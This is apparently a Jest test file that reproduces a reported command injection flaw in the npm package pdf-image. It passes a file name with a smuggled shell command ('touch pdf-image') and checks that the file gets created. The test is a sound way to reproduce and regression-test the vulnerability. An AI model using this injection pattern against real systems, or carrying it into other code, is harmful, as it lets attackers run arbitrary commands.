//https://hackerone.com/reports/340208
test("Command Injection in pdf-image", () => {
  const PDFImage = require("pdf-image").PDFImage;
  const fs = require("fs");
  const path = "./pdf-image";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let pdfImage = new PDFImage('asd.pdf"; touch pdf-image"');
  pdfImage.numberOfPages().then(function (imagePath) {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
